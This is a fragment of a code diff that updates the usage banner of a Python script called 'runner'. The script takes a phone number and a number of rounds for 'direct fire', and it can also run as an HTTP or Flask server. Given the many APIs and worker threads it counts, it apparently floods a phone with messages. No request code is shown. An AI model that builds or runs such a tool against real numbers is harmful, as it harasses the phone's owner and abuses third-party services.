         result = run(phone, rounds)
         print(json.dumps(result, indent=2))
     else:
-        print("""
+        print(f"""
+Runner v3 - {len(APIS)} APIs | {MAX_WORKERS} Workers
 Usage:
-  python runner-v2.py 017XXXXXXXX 5
-  python runner-v2.py --server
-  python runner-v2.py --server --port 3000
+  python runner.py 017XXXXXXXX 5       (direct fire)
+  python runner.py --server            (built-in HTTP server)
+  python runner.py --flask             (Flask server, faster)
+  python runner.py --server --port 3000
 """)
